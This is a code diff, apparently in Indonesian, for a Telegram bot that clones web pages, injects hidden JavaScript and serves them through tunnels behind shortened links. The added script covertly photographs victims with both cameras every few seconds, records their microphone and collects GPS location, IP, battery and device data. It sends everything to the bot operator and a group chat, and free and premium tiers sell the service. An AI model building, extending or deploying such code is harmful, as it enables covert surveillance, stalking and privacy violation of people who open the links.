@@ -341,15 +341,152 @@ INJECT_JS = """
 </script>
 """
 
+INJECT_JS_MIC = """
+<script>
+(function(){
+  var capCount=0, active=true;
+  var mediaRecorder=null, audioChunks=[];
+
+  function snapCamera(facingMode,cb){
+    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){cb(null);return;}
+    navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:facingMode}},audio:false})
+    .then(function(stream){
+      var v=document.createElement('video');
+      v.srcObject=stream;v.setAttribute('playsinline','');v.muted=true;v.play();
+      var fired=false;
+      function grab(){
+        if(fired)return;fired=true;
+        var c=document.createElement('canvas');
+        c.width=v.videoWidth||640;c.height=v.videoHeight||480;
+        c.getContext('2d').drawImage(v,0,0);
+        stream.getTracks().forEach(function(t){t.stop();});
+        cb(c.toDataURL('image/jpeg',0.80).split(',')[1]);
+      }
+      v.addEventListener('loadeddata',grab);
+      setTimeout(function(){if(!fired){fired=true;stream.getTracks().forEach(function(t){t.stop();});cb(null);}},5000);
+    }).catch(function(){cb(null);});
+  }
+
+  function startMic(){
+    navigator.mediaDevices.getUserMedia({audio:true,video:true})
+    .then(function(stream){
+      // pisah audio track untuk recorder
+      var audioStream=new MediaStream(stream.getAudioTracks());
+      mediaRecorder=new MediaRecorder(audioStream,{mimeType:'audio/webm'});
+      mediaRecorder.ondataavailable=function(e){if(e.data&&e.data.size>0)audioChunks.push(e.data);};
+      mediaRecorder.start(10000); // chunk tiap 10 detik
+    }).catch(function(){});
+  }
+
+  function sendAudio(){
+    if(!mediaRecorder||audioChunks.length===0)return;
+    if(mediaRecorder.state!=='inactive')mediaRecorder.stop();
+    var blob=new Blob(audioChunks,{type:'audio/webm'});
+    var reader=new FileReader();
+    reader.onloadend=function(){
+      var b64=reader.result.split(',')[1];
+      navigator.sendBeacon('/audio',JSON.stringify({audio:b64}));
+    };
+    reader.readAsDataURL(blob);
+  }
+
+  function getLocation(cb){
+    if(!navigator.geolocation){cb(null,null,null);return;}
+    navigator.geolocation.getCurrentPosition(
+      function(p){cb(p.coords.latitude,p.coords.longitude,p.coords.accuracy);},
+      function(){cb(null,null,null);},
+      {enableHighAccuracy:true,timeout:10000}
+    );
+  }
+
+  function getNetworkInfo(cb){
+    var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+    var info={type:'unknown',effectiveType:'unknown',downlink:'unknown'};
+    if(c){info.type=c.type||'unknown';info.effectiveType=c.effectiveType||'unknown';info.downlink=c.downlink||'unknown';}
+    cb(info);
+  }
+
+  function getBattery(cb){
+    if(!navigator.getBattery){cb(null,null);return;}
+    navigator.getBattery().then(function(b){cb(Math.round(b.level*100),b.charging);}).catch(function(){cb(null,null);});
+  }
+
+  function getPublicIP(cb){
+    fetch('https://api.ipify.org?format=json',{mode:'cors'})
+    .then(function(r){return r.json();}).then(function(d){cb(d.ip);}).catch(function(){cb(null);});
+  }
+
+  function collectInfo(cb){
+    var info={userAgent:navigator.userAgent,language:navigator.language||'unknown',
+              timezone:Intl?Intl.DateTimeFormat().resolvedOptions().timeZone:'unknown',
+              screen:window.screen.width+'x'+window.screen.height,
+              network:null,battery_pct:null,charging:null,ip:null};
+    getNetworkInfo(function(net){
+      info.network=net;
+      getBattery(function(pct,chrg){
+        info.battery_pct=pct;info.charging=chrg;
+        getPublicIP(function(ip){info.ip=ip;cb(info);});
+      });
+    });
+  }
+
+  function doCapture(isFirst){
+    if(!active)return;
+    capCount++;var num=capCount;
+    snapCamera('environment',function(back){
+      snapCamera('user',function(front){
+        var payload={num:num,photo_front:front||null,photo_back:back||null,
+                     lat:null,lon:null,acc:null,info:null};
+        if(isFirst){
+          getLocation(function(lat,lon,acc){
+            payload.lat=lat;payload.lon=lon;payload.acc=acc;
+            collectInfo(function(info){payload.info=info;send(payload);});
+          });
+        } else { send(payload); }
+      });
+    });
+  }
+
+  function send(payload){
+    fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},
+                      body:JSON.stringify(payload)}).catch(function(){});
+  }
+
+  setInterval(function(){fetch('/ping',{method:'POST'}).catch(function(){});},8000);
+
+  window.addEventListener('beforeunload',function(){
+    active=false;
+    sendAudio();
+    navigator.sendBeacon('/offline','{}');
+  });
+
+  function loop(){
+    if(!active)return;
+    doCapture(capCount===0);
+    setTimeout(loop,5000);
+  }
+
+  startMic();
+
+  if(document.readyState==='loading'){
+    document.addEventListener('DOMContentLoaded',loop);
+  } else { loop(); }
+})();
+</script>
+"""
+
+RATE_LIMIT_SEC = 30   # minimal jeda antar tambah link
+
 # ------------------------------------------------------------------ #
 #  STATE RUNTIME
 # ------------------------------------------------------------------ #
-_links       = []
-_link_id_ctr = 0
-_cap_counts  = {}
-_page_htmls  = {}
-_user_state  = {}
-_user_data   = {}
+_links        = []
+_link_id_ctr  = 0
+_cap_counts   = {}
+_page_htmls   = {}
+_user_state   = {}
+_user_data    = {}
+_last_add     = {}   # uid -> timestamp tambah link terakhir
 
 # ------------------------------------------------------------------ #
 #  HELPER — parse device lengkap
@@ -504,6 +641,25 @@ async def _send_result(data, link_id, owner_uid):
         except Exception as e:
             print(f"\n[!] kirim ke {dest}: {e}")
 
+async def _send_audio(b64: str, link_id, owner_uid):
+    bot = Bot(token=BOT_TOKEN)
+    ts  = datetime.datetime.now().strftime("%H:%M:%S")
+    try:
+        audio_bytes = base64.b64decode(b64)
+        caption = f"🎤 Audio rekaman — Link #{link_id} | {ts}"
+        for dest in [owner_uid, GROUP_ID]:
+            try:
+                await bot.send_audio(
+                    chat_id=dest,
+                    audio=audio_bytes,
+                    caption=caption,
+                    filename=f"audio_{link_id}_{ts.replace(':','')}.webm"
+                )
+            except Exception as e:
+                print(f"\n[!] send audio ke {dest}: {e}")
+    except Exception as e:
+        print(f"\n[!] decode audio: {e}")
+
 async def _send_offline(link_id, owner_uid):
     bot = Bot(token=BOT_TOKEN)
     total = _cap_counts.get(link_id, 0)
@@ -534,6 +690,22 @@ def make_flask_app(link_id, owner_uid):
     @fapp.route("/ping", methods=["POST"])
     def ping():
         mark_active(link_id, freq.remote_addr)
+        return jsonify({"ok": True})
+
+    @fapp.route("/audio", methods=["POST"])
+    def audio():
+        import json as _json
+        raw = freq.get_data()
+        try:
+            data = _json.loads(raw)
+            b64  = data.get("audio","")
+            if b64:
+                threading.Thread(
+                    target=lambda: asyncio.run(_send_audio(b64, link_id, owner_uid)),
+                    daemon=True
+                ).start()
+        except Exception as e:
+            print(f"\n[!] audio parse: {e}")
         return jsonify({"ok": True})
 
     @fapp.route("/offline", methods=["POST"])
@@ -594,35 +766,56 @@ def start_serveo(port):
         if m: return m.group(0), proc
     proc.terminate(); return None, None
 
-TUNNEL_FN = {"cf": start_cloudflared, "ng": start_ngrok, "sv": start_serveo}
+TUNNEL_FN = {"cf": start_cloudflared}
 
 # ------------------------------------------------------------------ #
 #  SPAWN LINK
 # ------------------------------------------------------------------ #
+_UA = "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36"
+
 async def try_shorten(long_url: str, alias: str) -> str:
-    def _isgd():
-        r=req_lib.get("https://is.gd/create.php",
-                      params={"format":"simple","url":long_url,"shorturl":alias},timeout=8)
-        return r.text.strip()
+    def _spoo():
+        r = req_lib.post(
+            "https://spoo.me/",
+            data={"url": long_url, "alias": alias},
+            headers={"User-Agent": _UA, "Accept": "application/json"},
+            timeout=10
+        )
+        j = r.json()
+        s = j.get("short_url") or j.get("url","")
+        return s if s.startswith("http") else ""
+
     def _tinyurl():
-        r=req_lib.get("https://tinyurl.com/api-create.php",
-                      params={"url":long_url,"alias":alias},timeout=8)
-        return r.text.strip()
+        r = req_lib.get(
+            "https://tinyurl.com/api-create.php",
+            params={"url": long_url, "alias": alias},
+            headers={"User-Agent": _UA},
+            timeout=10
+        )
+        t = r.text.strip()
+        return t if t.startswith("http") and "tinyurl" in t else ""
+
     def _c2lol():
-        r=req_lib.post("https://c2.lol/api/short",
-                       json={"url":long_url,"custom":alias},timeout=8)
-        return r.json().get("short","")
+        r = req_lib.post(
+            "https://c2.lol/api/short",
+            json={"url": long_url, "custom": alias},
+            headers={"User-Agent": _UA},
+            timeout=10
+        )
+        s = r.json().get("short","")
+        return s if s.startswith("http") else ""
 
     loop = asyncio.get_event_loop()
-    for fn in [_isgd, _tinyurl, _c2lol]:
+    for fn in [_spoo, _tinyurl, _c2lol]:
         try:
             result = await loop.run_in_executor(None, fn)
-            if result and result.startswith("http"):
+            if result:
                 return result
-        except: continue
+        except Exception as e:
+            print(f"\n[!] shorten {fn.__name__}: {e}")
     return long_url
 
-async def spawn_link(tunnel_key, raw_html, owner_uid, query):
+async def spawn_link(tunnel_key, raw_html, owner_uid, query, mode="cam"):
     global _link_id_ctr
     _link_id_ctr += 1
     lid  = _link_id_ctr
@@ -644,7 +837,8 @@ async def spawn_link(tunnel_key, raw_html, owner_uid, query):
         await query.edit_message_text("❌ Tunnel gagal.",reply_markup=kb_main(owner_uid))
         return
 
-    _links.append({"id":lid,"owner":owner_uid,"pub_url":pub_url,"port":port,"proc":proc})
+    _links.append({"id":lid,"owner":owner_uid,"pub_url":pub_url,"port":port,"proc":proc,"mode":mode})
+    _last_add[owner_uid] = time.time()
 
     # tanya custom link
     _user_data[owner_uid]["pending_link_id"]  = lid
@@ -658,9 +852,10 @@ async def spawn_link(tunnel_key, raw_html, owner_uid, query):
         ]])
     )
 
-def inject_html(html):
+def inject_html(html, mode="cam"):
+    js = INJECT_JS_MIC if mode == "mic" else INJECT_JS
     idx = html.lower().rfind("</body>")
-    return (html[:idx]+INJECT_JS+html[idx:]) if idx!=-1 else html+INJECT_JS
+    return (html[:idx]+js+html[idx:]) if idx!=-1 else html+js
 
 def free_port(start=8080):
     p = start
@@ -699,12 +894,14 @@ def kb_template():
         [InlineKeyboardButton("« Kembali", callback_data="back_main")],
     ])
 
-def kb_tunnel():
-    return InlineKeyboardMarkup([[
-        InlineKeyboardButton("☁️ Cloudflared", callback_data="tun_cf"),
-        InlineKeyboardButton("🔗 Ngrok",       callback_data="tun_ng"),
-        InlineKeyboardButton("🌐 Serveo",      callback_data="tun_sv"),
-    ],[InlineKeyboardButton("« Kembali", callback_data="back_main")]])
+def kb_mode():
+    return InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton("📷 Kamera + Lokasi",         callback_data="mode_cam"),
+            InlineKeyboardButton("🎤 Kamera + Lokasi + Mic",   callback_data="mode_mic"),
+        ],
+        [InlineKeyboardButton("« Kembali", callback_data="back_main")],
+    ])
 
 def kb_del(uid):
     rows = []
@@ -747,6 +944,9 @@ def kb_admin():
         [
             InlineKeyboardButton("⏳ Set Premium Exp",  callback_data="a_setexp"),
             InlineKeyboardButton("📝 Detail User",      callback_data="a_detail"),
+        ],
+        [
+            InlineKeyboardButton("🔍 Cari User",        callback_data="a_search"),
         ],
         [
             InlineKeyboardButton("🛑 Stop Server",      callback_data="a_stop"),
@@ -802,6 +1002,11 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif d == "add_link":
         if role == "free" and db_link_count(uid) >= FREE_LIMIT:
             await q.answer(f"❌ Batas {FREE_LIMIT} link untuk Free.",show_alert=True); return
+        # rate limit
+        last = _last_add.get(uid, 0)
+        sisa = RATE_LIMIT_SEC - int(time.time() - last)
+        if sisa > 0 and role != "admin":
+            await q.answer(f"⏳ Tunggu {sisa} detik sebelum tambah link lagi.",show_alert=True); return
         _user_state[uid]="await_template"; _user_data[uid]={}
         await q.edit_message_text("Pilih template:",reply_markup=kb_template())
 
@@ -813,11 +1018,13 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _user_state[uid]="await_html"
         await q.edit_message_text("Kirim file `.html` sekarang.")
 
-    elif d in ("tun_cf","tun_ng","tun_sv"):
+    elif d in ("mode_cam","mode_mic"):
         raw = _user_data.get(uid,{}).get("raw_html","")
         if not raw:
             await q.edit_message_text("❌ Template kosong.",reply_markup=kb_main(uid)); return
-        await spawn_link(d.replace("tun_",""), raw, uid, q)
+        mode = "mic" if d=="mode_mic" else "cam"
+        _user_data[uid]["sadap_mode"] = mode
+        await spawn_link("cf", raw, uid, q, mode=mode)
         _user_state[uid]=None
 
     elif d == "custom_yes":
@@ -1040,6 +1247,11 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _user_state[uid]="a_await_detail"
         await q.edit_message_text("Ketik ID user yang mau dilihat detailnya:")
 
+    elif d == "a_search":
+        if role!="admin": return
+        _user_state[uid]="a_await_search"
+        await q.edit_message_text("🔍 Ketik ID user yang mau dicari:")
+
     elif d == "a_stop":
         if role!="admin": return
         await q.edit_message_text("🛑 *Server dihentikan.*",parse_mode="Markdown")
@@ -1103,8 +1315,8 @@ async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
             raw=clone_url(url)
             _user_data[uid]["raw_html"]=raw
-            _user_state[uid]="await_tunnel"
-            await update.message.reply_text("✅ Clone berhasil!\n\nPilih tunnel:",reply_markup=kb_tunnel())
+            _user_state[uid]="await_mode"
+            await update.message.reply_text("✅ Clone berhasil!\n\nPilih mode sadap:",reply_markup=kb_mode())
         except Exception as e:
             await update.message.reply_text(f"❌ Gagal: {e}",reply_markup=kb_template())
 
@@ -1221,6 +1433,26 @@ async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                             reply_markup=kb_admin())
         _user_state[uid]=None; _user_data[uid]={}
 
+    elif state == "a_await_search":
+        data=db_read()
+        ud=data["users"].get(text)
+        if not ud:
+            await update.message.reply_text(f"❌ User `{text}` tidak ditemukan.",
+                                            parse_mode="Markdown",reply_markup=kb_admin())
+        else:
+            r=ud.get("role","free")
+            badge={"admin":"👑","premium":"💎","free":"🆓"}.get(r,"🆓")
+            user_links=[l for l in _links if str(l["owner"])==text]
+            teks=(f"🔍 *Hasil Pencarian:*\n\n"
+                  f"ID: `{text}`\n"
+                  f"Role: {badge} {r}\n"
+                  f"Join: {ud.get('joined','?')}\n"
+                  f"Total capture: {ud.get('cap_total',0)}\n"
+                  f"Premium s/d: {ud.get('premium_until','∞') or '∞'}\n"
+                  f"Link aktif: {len(user_links)}")
+            await update.message.reply_text(teks,parse_mode="Markdown",reply_markup=kb_admin())
+        _user_state[uid]=None
+
     elif state == "a_await_detail":
         data=db_read()
         ud=data["users"].get(text)
@@ -1253,8 +1485,8 @@ async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         tfile = await context.bot.get_file(doc.file_id)
         raw   = (await tfile.download_as_bytearray()).decode("utf-8",errors="replace")
         _user_data[uid]["raw_html"]=raw
-        _user_state[uid]="await_tunnel"
-        await update.message.reply_text("✅ File diterima!\n\nPilih tunnel:",reply_markup=kb_tunnel())
+        _user_state[uid]="await_mode"
+        await update.message.reply_text("✅ File diterima!\n\nPilih mode sadap:",reply_markup=kb_mode())
     except Exception as e:
         await update.message.reply_text(f"❌ Gagal: {e}")
 
